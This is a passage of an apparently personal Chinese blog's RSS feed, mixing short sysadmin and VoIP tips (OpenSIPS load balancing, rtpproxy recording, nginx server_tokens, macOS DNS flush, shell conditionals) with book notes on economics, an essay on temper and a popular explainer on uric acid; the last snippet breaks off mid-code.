&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>小岛经济学: 鱼、美元和经济的故事</title>
      <link>https://wdd.js.org/posts/2020/05/kn7c4e/</link>
      <pubDate>Fri, 22 May 2020 20:35:13 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/05/kn7c4e/</guid>
      <description>&lt;p&gt;之前读完鱼、美元和经济学的故事第一版，令我印象深刻。后来kindle上有出现了这本书的第二版，内容增加了，并且也增加了一些好看的插图。&lt;/p&gt;
&lt;p&gt;我度过不少经济学的书，《国富论》是比较深奥的一本，我只能看懂前面一两章，就读不下去了。&lt;/p&gt;
&lt;p&gt;但是小岛经济学的这本书，真的把经济学里难以理解的东西说的通俗易懂。&lt;/p&gt;
&lt;p&gt;也许经济学本来并不是那么难以理解，只是专家慢慢变多了，他们就把经济学变得难以理解了。因为只有这样，才能显得他们是多么的富有聪明才智。&lt;/p&gt;
&lt;h1 id=&#34;1-自己的生意&#34;&gt;1. 自己的生意&lt;/h1&gt;
&lt;p&gt;每个人实际上都在经营自己的生意，将自己的劳动力卖给出价最高的老板。&lt;/p&gt;
&lt;h1 id=&#34;2-员工的价值&#34;&gt;2. 员工的价值&lt;/h1&gt;
&lt;p&gt;员工的价值主要取决于三个方面：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;需求（老板是否需要员工所掌握的技能）&lt;/li&gt;
&lt;li&gt;供应（有多少人具备这些技能）&lt;/li&gt;
&lt;li&gt;生产力（员工对那些工作完成的程度如何）&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;所以，你的价值并不会因为你吃苦耐劳而升高。&lt;/p&gt;
&lt;h1 id=&#34;3-纽约地铁&#34;&gt;3. 纽约地铁&lt;/h1&gt;
&lt;p&gt;纽约的地址由私营公司建设，40年内都是由私营公司负责运营。虽然地铁造价不菲，但是还是实现了盈利。更值得一提的是，40年里车票的价格从未上涨。&lt;/p&gt;
&lt;p&gt;这是值得深思的地方，有些公共事情，私营公司来做可能要比政府做的更好、效率更高。&lt;/p&gt;
&lt;p&gt;政府对公共设施的垄断，很大的可能会造成效率低下和贪污腐败。&lt;/p&gt;
&lt;h1 id=&#34;4-经济的目的&#34;&gt;4. 经济的目的&lt;/h1&gt;
&lt;p&gt;提供就业岗位并不是经济的目的，经济的目的是不断提高生产力。&lt;/p&gt;
&lt;h1 id=&#34;5-膨胀与紧缩&#34;&gt;5. 膨胀与紧缩&lt;/h1&gt;
&lt;p&gt;通货膨胀就是货币的供给增加，相反的就是通货紧缩。价格并不会膨胀或者紧缩，价格只能上涨或者下跌。膨胀的不是价格，而是货币供给。&lt;/p&gt;
&lt;h1 id=&#34;6-谁需要你的货币&#34;&gt;6. 谁需要你的货币？&lt;/h1&gt;
&lt;p&gt;如果没有人想购买你的产品，也就没有人需要你的货币。&lt;/p&gt;
&lt;p&gt;美国的很多产品在全世界都很吃香，所以美元是很多国家都需要的。&lt;/p&gt;
&lt;h1 id=&#34;7-人们为何消费&#34;&gt;7. 人们为何消费？&lt;/h1&gt;
&lt;p&gt;经济并不会因为人们的消费而增长，而是经济增长会自然的带动人们的消费。&lt;/p&gt;
&lt;p&gt;但是目前看来，眼下最为火爆的就是“带货”这个词，各种人物，无论是公众明星还是普通人，都想来搞带货。&lt;/p&gt;
&lt;p&gt;各种新闻报道也在大肆宣扬，某某明星直播带货xxx亿元。&lt;/p&gt;
&lt;p&gt;当你被xxx亿元吸引时，你是否也曾暗暗思考过，这些钱来自哪里？ 买这些东西对于消费者来说，又有什么好处。&lt;/p&gt;
&lt;p&gt;在经济以为疫情的影响和下行时，为什么会有那么多人疯狂购物呢？&lt;/p&gt;
&lt;p&gt;天下皆知美之为美，斯恶已。我想这种带货的模式，也许就快要到尽头了。&lt;/p&gt;
&lt;h1 id=&#34;8-量化宽松&#34;&gt;8. 量化宽松&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;北京的白菜（一到）浙江,便用红头绳系住菜根,倒挂在水果店头,尊为“胶菜”；福建野生着的芦荟,（运往）北京就请进温室,且美其名曰“龙舌兰”. 《藤野先生》鲁迅&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;明明白白的通货膨胀，到了经济学家和政客的嘴里，美其名曰“量化宽松”。&lt;/p&gt;</description>
    </item>
    <item>
      <title>文件名以-开头</title>
      <link>https://wdd.js.org/posts/2020/05/ei2y93/</link>
      <pubDate>Thu, 21 May 2020 15:24:33 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/05/ei2y93/</guid>
      <description>&lt;p&gt;-.slice&lt;/p&gt;
&lt;p&gt;用 &amp;ndash; 表示参数已经结束&lt;/p&gt;
&lt;p&gt;cat &amp;ndash; -.slice&lt;!-- raw HTML omitted --&gt;vim &amp;ndash; -.slice&lt;/p&gt;</description>
    </item>
    <item>
      <title>负载均衡模块load_balance</title>
      <link>https://wdd.js.org/opensips/ch6/load-balance/</link>
      <pubDate>Tue, 19 May 2020 09:42:10 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch6/load-balance/</guid>
      <description>&lt;ul&gt;
&lt;li&gt;负载均衡只能均衡INVITE, 不能均衡REGISTER请求。因为load_blance底层是使用dialog模块去跟踪目标地址的负载情况。&lt;/li&gt;
&lt;li&gt;load_balance方法会改变INVITE的$du,  而不会修改SIP URL&lt;/li&gt;
&lt;li&gt;呼叫结束的时候，目标地址的负载会自动释放&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;选择逻辑&#34;&gt;选择逻辑&lt;/h1&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;&lt;/th&gt;
          &lt;th&gt;网关A&lt;/th&gt;
          &lt;th&gt;网关B&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;通道数&lt;/td&gt;
          &lt;td&gt;30&lt;/td&gt;
          &lt;td&gt;60&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;正在使用的通道数&lt;/td&gt;
          &lt;td&gt;20&lt;/td&gt;
          &lt;td&gt;55&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;空闲通道数&lt;/td&gt;
          &lt;td&gt;10&lt;/td&gt;
          &lt;td&gt;5&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;load_balance是会先选择最大可用资源的目标地址。假如A网关的最大并发呼叫是30， B网关最大并发呼叫是60。在某个时刻，A网关上已经有20和呼叫了, B网关上已经有55个呼叫。 此时load_balance会优先选择网关A。&lt;/p&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://opensips.org/Documentation/Tutorials-LoadBalancing-1-9&#34;&gt;https://opensips.org/Documentation/Tutorials-LoadBalancing-1-9&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>rtpproxy录音</title>
      <link>https://wdd.js.org/opensips/ch4/rtp-record/</link>
      <pubDate>Thu, 14 May 2020 16:13:10 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/ch4/rtp-record/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-a -R -r /recording -S spool -P
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;ul&gt;
&lt;li&gt;-a 所有的通话都录音&lt;/li&gt;
&lt;li&gt;-R 不要把RTCP也写文件&lt;/li&gt;
&lt;li&gt;-r  指定录音文件的位置&lt;/li&gt;
&lt;li&gt;-S 临时文件的位置，注意不要和录音文件位置相同&lt;/li&gt;
&lt;li&gt;-P 录成pcap文件的格式，而不要录成默认的 Ad-hoc的模式&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>nginx 配置不显示版本号</title>
      <link>https://wdd.js.org/posts/2020/05/es9hvu/</link>
      <pubDate>Thu, 14 May 2020 09:44:46 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/05/es9hvu/</guid>
      <description>&lt;h1 id=&#34;隐藏版本号&#34;&gt;隐藏版本号&lt;/h1&gt;
&lt;p&gt;nginx会在响应头上添加如下的头。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Server: nginx/1.17.9
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果不想在Server部分显示出nginx的版本号，需要在nginx.conf的http{}部分设置&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;http &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	server_tokens off;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然后重启nginx, nginx的响应头就会变成。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Server: nginx
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>获取进程工作目录</title>
      <link>https://wdd.js.org/posts/2020/05/azkyhl/</link>
      <pubDate>Thu, 14 May 2020 09:20:47 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/05/azkyhl/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;pwdx pid
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;lsof -p pid | grep cwd
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>你好，下丘脑</title>
      <link>https://wdd.js.org/posts/2020/05/nkegg6/</link>
      <pubDate>Tue, 12 May 2020 22:44:49 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/05/nkegg6/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;人的大脑中有个器官，叫做下丘脑。下丘脑有控制体温控制的功能。刚出生的婴儿，下丘脑发育不完全，无法调节自己的体温。所以一般都把小宝宝包被子里，而她只能通过哭闹反应自己的不适。&lt;/p&gt;&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;随着身体的发育，下丘脑逐渐掌握体温控制的功能。&lt;/p&gt;&lt;/blockquote&gt;
&lt;p&gt;白天越来越长，从电脑屏幕上抬起头，发现已经有人收拾桌面，准备好要下班了。&lt;/p&gt;
&lt;p&gt;不知不觉，已经六点多了。&lt;/p&gt;
&lt;p&gt;夕阳西下，晚霞似火，凉风习习。&lt;/p&gt;
&lt;p&gt;漕河泾的腾讯大楼，影子被拉到地下停车场的入口，彷佛是情人间的法式舌吻。&lt;/p&gt;
&lt;p&gt;园区里行人匆匆，车辆缓缓～&lt;/p&gt;
&lt;p&gt;掐指算起，毕业已四年。时间如白驹过隙，指间流沙。&lt;/p&gt;
&lt;p&gt;恍然间，三十将至，尚未而立。&lt;/p&gt;
&lt;p&gt;小孩子爱憎分明，喜欢与不喜欢就直接说，不懂得拐弯抹角。&lt;/p&gt;
&lt;p&gt;成年人放下爱憎，只有生存&lt;/p&gt;
&lt;p&gt;无论如何，你应当体谅别人的世界与你的不同。&lt;/p&gt;
&lt;p&gt;对你来说，很容易理解的问题。可能对别人来说，是难以理解的。&lt;/p&gt;
&lt;p&gt;不要将自己当作干柴，稍微一点，就成烈火。&lt;/p&gt;
&lt;p&gt;当你知道你将要说的话会让别人难堪时，请咽下去吧。&lt;/p&gt;
&lt;p&gt;不要轻易否定一个人的工作价值，每个人都希望自己得到肯定。&lt;/p&gt;
&lt;p&gt;无论是对待陌生人、同事、或者是朋友。&lt;/p&gt;
&lt;p&gt;我们不是刚出生的婴儿，我们有完全发育的下丘脑。&lt;/p&gt;
&lt;p&gt;控制你的体温，同时也控制你的脾气，你说话的方式。&lt;/p&gt;
&lt;p&gt;每个人都值得温柔以待，即使是你不喜欢的人。&lt;/p&gt;
&lt;p&gt;你好，下丘脑～&lt;/p&gt;</description>
    </item>
    <item>
      <title>尿酸简史</title>
      <link>https://wdd.js.org/posts/2020/05/teadt5/</link>
      <pubDate>Tue, 12 May 2020 15:47:14 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/05/teadt5/</guid>
      <description>&lt;h1 id=&#34;从细胞说起&#34;&gt;从细胞说起&lt;/h1&gt;
&lt;p&gt;人体由细胞组成。人体的细胞中大约有40-60万亿个。细胞无时无刻不再新老更替、新陈代谢。&lt;/p&gt;
&lt;p&gt;微观世界的细胞变化，反应在人体生产，就是一个人从成长到衰老的过程。&lt;/p&gt;
&lt;p&gt;细胞中有一种重要的物质，核酸。核酸是脱氧核糖核酸(DNA)和核糖核酸(RNA)的总称。&lt;/p&gt;
&lt;p&gt;核酸由无数的核苷酸组成，核苷酸里有一种物质叫做嘌呤。而嘌呤和人体的尿酸有着密不可分的关系。&lt;/p&gt;
&lt;p&gt;除了作为遗传物质的一部分，嘌呤中的腺嘌呤也是腺苷三磷酸(ATP)的重要组成部分。APT是人体直接的能量来源。&lt;/p&gt;
&lt;p&gt;在剧烈运动时，APT会进一步分解成腺嘌呤。&lt;/p&gt;
&lt;p&gt;总之：&lt;strong&gt;尿酸和嘌呤的关系非常密切。人体细胞的遗传物质以及作为能量来源的APT都会产生嘌呤。&lt;/strong&gt;&lt;/p&gt;
&lt;h1 id=&#34;尿酸来源分类&#34;&gt;尿酸来源分类&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;内源性尿酸： 来自人体自身细胞衰亡，残留的嘌呤经过酶的作用产生尿酸&lt;/li&gt;
&lt;li&gt;外源性尿酸: 大多来自食物中的嘌呤类化合物、核酸、核蛋白等物质、经过酶的作用下产生尿酸。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我们身体中的尿酸2/3来自自身的生命活动, 1/3来自食物。&lt;/p&gt;
&lt;h1 id=&#34;尿酸的合成与排泄&#34;&gt;尿酸的合成与排泄&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;大部分的嘌呤在肝脏中经过氧化代谢、变成尿酸。在词过程中，有两类酶扮演着重要作用。
&lt;ul&gt;
&lt;li&gt;抑制尿酸合成的酶&lt;/li&gt;
&lt;li&gt;促进尿酸合成的酶&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;2/3的尿酸通过肾脏排出。肾脏只有也有能够促进或者抑制尿酸重吸收的酶。&lt;/li&gt;
&lt;li&gt;1/3的尿酸通过肠道排出&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;所以尿酸较高的患者，医生会让你抽血查肝功能和肾功能，如果肝脏中的某些指标异常，也会进一步通过B超去做进一步的判断。&lt;/p&gt;
&lt;p&gt;很多人误以为尿酸是查尿液，实际上这是被尿酸的名字误解了，尿酸是抽血检测的。&lt;/p&gt;
&lt;p&gt;人体中酶在声明活动中扮演着重要的角色。酶就好像是太极中的阴与阳一样，相互制衡达到平衡之时，身体才会健康。否则阴阳失衡，必然会存在身体病变。&lt;/p&gt;
&lt;p&gt;另外一些降低尿酸的药品，例如苯溴马隆片，其药理也是通过降低肾脏对尿酸的重吸收，来促进尿酸的排泄的。&lt;/p&gt;
&lt;h1 id=&#34;食物中的尿酸对人体影响有多大&#34;&gt;食物中的尿酸对人体影响有多大？&lt;/h1&gt;
&lt;p&gt;具体哪些不能吃，哪些能吃，网上都有很多资料了。总之，大鱼大肉是要尽量避免的。食物主要要以清淡为主，吃饭不要吃撑，尽量迟到7分饱，或者迟到不饿为佳。&lt;/p&gt;
&lt;h1 id=&#34;高尿酸的危害&#34;&gt;高尿酸的危害&lt;/h1&gt;
&lt;p&gt;有溶解度相关知识的同学都会知道，溶质在溶液中都是由溶解度的，超过溶解度之后，物质就会析出。尿酸也是如此，过饱和的尿酸会析出称为尿酸结晶。&lt;/p&gt;
&lt;p&gt;这些结晶会沉积在关节和各种软组织，就可能造成这些部位的损害。&lt;/p&gt;
&lt;p&gt;当尿酸结晶附着在关节软骨表面上的滑膜上时，血液中的白细胞会把它当做敌人，释放各种酶去进攻。这些酶在进攻敌人的同时，对自身的关节软骨的溶解和自身软组织的损伤。 对痛风患者而言，感受到的就是苦不堪言的痛风性关节炎&lt;/p&gt;
&lt;p&gt;另外，大量的尿酸最终是通过肾脏排泄的，如果尿酸在肾脏上析出。对肾脏也会造成难以修复的损害，甚至患上尿毒症。光听这个尿毒症的名字，你就应该这道，这个病有多厉害。当你管不住自己嘴的时候，想想尿毒症吧。&lt;/p&gt;
&lt;p&gt;不要等到失去任劳任怨的肾脏之后，再后悔莫及。&lt;/p&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://baike.baidu.com/item/%E4%BA%BA%E4%BD%93%E7%BB%86%E8%83%9E&#34;&gt;https://baike.baidu.com/item/%E4%BA%BA%E4%BD%93%E7%BB%86%E8%83%9E&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>另一个功能强大的sip server: kamailio</title>
      <link>https://wdd.js.org/opensips/tools/kamailio/</link>
      <pubDate>Tue, 12 May 2020 15:43:33 +0800</pubDate>
      <guid>https://wdd.js.org/opensips/tools/kamailio/</guid>
      <description>&lt;p&gt;之前我写过OpenSIPS的文章，所以在学习Kamailio是，会尝试和OpenSIPS做对比。&lt;/p&gt;
&lt;p&gt;从下图可以看出，Kamailio和Opensips算是同根同源了。很多语法、伪变量、模块使用方式，两者都极为相似。&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://wdd.js.org/opensips/tools/kamailio/2022-12-03-15-49-16.png&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;不一样的点&#34;&gt;不一样的点&lt;/h1&gt;
&lt;p&gt;然而总体来说，kamailio相比OpenSIPS，更加灵活。 如果有机会，尝试下kamailio也未尝不可。而且kamailio的git start数量比OpenSIPS多很多，而且issue也比OpenSIPS少。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Kamailio 有wiki社区，注册之后，可以来编辑文档，相比于OpenSIPS只有官方文档，kamailio显得更容易让人亲近，提高了用户的参与度。&lt;/li&gt;
&lt;li&gt;脚本上
&lt;ol&gt;
&lt;li&gt;kamailio支持三种不同的注释风格，opensips只支持一种&lt;/li&gt;
&lt;li&gt;kamailio支持类似c语言的宏定义的方式写脚本，因而kamailio的脚本可以不借助外部工具的情况下，写的非常灵活。可以参考 &lt;a href=&#34;https://www.kamailio.org/wiki/cookbooks/5.5.x/core&#34;&gt;https://www.kamailio.org/wiki/cookbooks/5.5.x/core&lt;/a&gt; 的define部分&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;li&gt;代码质量上
&lt;ol&gt;
&lt;li&gt;我觉得也是kaimailio也是更胜一筹，至少kamailioo还做了c的单元测试&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;总体而言，如果你要是第一次来选择，我更希望你用kamailio作为sip服务器。我之所以用OpenSIPS只不过是路径依赖而已。&lt;/p&gt;
&lt;p&gt;但是如果你学会了OpenSIPS, 那你学习kamailio就会非常轻松。&lt;/p&gt;
&lt;h1 id=&#34;参考&#34;&gt;参考&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://weekly-geekly.github.io/articles/150280/index.html&#34;&gt;https://weekly-geekly.github.io/articles/150280/index.html&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/kamailio/kamailio&#34;&gt;https://github.com/kamailio/kamailio&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://www.kamailio.org/wiki/&#34;&gt;https://www.kamailio.org/wiki/&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description>
    </item>
    <item>
      <title>kaldi安装</title>
      <link>https://wdd.js.org/posts/2020/05/haowe5/</link>
      <pubDate>Tue, 12 May 2020 15:40:02 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/05/haowe5/</guid>
      <description>&lt;p&gt;为了省去安装的麻烦，我直接使用的是容器版本的kaldi&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://hub.docker.com/r/kaldiasr/kaldi&#34;&gt;https://hub.docker.com/r/kaldiasr/kaldi&lt;/a&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;docker pull kaldiasr/kaldi
&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;This is the official Docker Hub of the Kaldi project: http://kaldi-asr.org

Kaldi offers two sets of images: CPU-based images and GPU-based images. Daily builds of the latest version of the master branch (both CPU and GPU images) are pushed to DockerHub.

Sample usage of the CPU based images:

docker run -it kaldiasr/kaldi:latest

Sample usage of the GPU based images:

Note: use nvidia-docker to run the GPU images.

docker run -it --runtime=nvidia kaldiasr/kaldi:gpu-latest

Please refer to Kaldi&amp;#39;s GitHub repository for more details.
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;kaldiasr/kaldi这个镜像是基于linuxkit构建的，如果缺少什么包，可以使用apt命令在容器中安装&lt;/p&gt;</description>
    </item>
    <item>
      <title>Type &#39;Timeout&#39; is not assignable to type &#39;number&#39;</title>
      <link>https://wdd.js.org/posts/2020/05/uwe59t/</link>
      <pubDate>Tue, 12 May 2020 15:35:54 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/05/uwe59t/</guid>
      <description>&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;timer&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;NodeJS&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;Timer&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;timer&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;global&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;setTimeout&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;myFunction&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1000&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;参考&lt;!-- raw HTML omitted --&gt;&lt;a href=&#34;http://evanshortiss.com/development/nodejs/typescript/2016/11/16/timers-in-typescript.html&#34;&gt;http://evanshortiss.com/development/nodejs/typescript/2016/11/16/timers-in-typescript.html&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>macbook 清空DNS缓存</title>
      <link>https://wdd.js.org/posts/2020/05/gy02f8/</link>
      <pubDate>Mon, 11 May 2020 17:40:48 +0800</pubDate>
      <guid>https://wdd.js.org/posts/2020/05/gy02f8/</guid>
      <description>&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;sudo killall -HUP mDNSResponder
&lt;/code&gt;&lt;/pre&gt;</description>
    </item>
    <item>
      <title>比较与测试</title>
      <link>https://wdd.js.org/shell/cond-test/</link>
      <pubDate>Mon, 11 May 2020 13:01:07 +0800</pubDate>
      <guid>https://wdd.js.org/shell/cond-test/</guid>
      <description>&lt;h1 id=&#34;if&#34;&gt;if&lt;/h1&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# if&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; condition; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	commands;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# if else if&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; condition; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	commands;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; condition; &lt;span style=&#34;color:#66d9ef&#34;&gt;then&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	commands;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	commands;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;fi&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;简单版本的 if 测试&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt; condtion &lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; action;
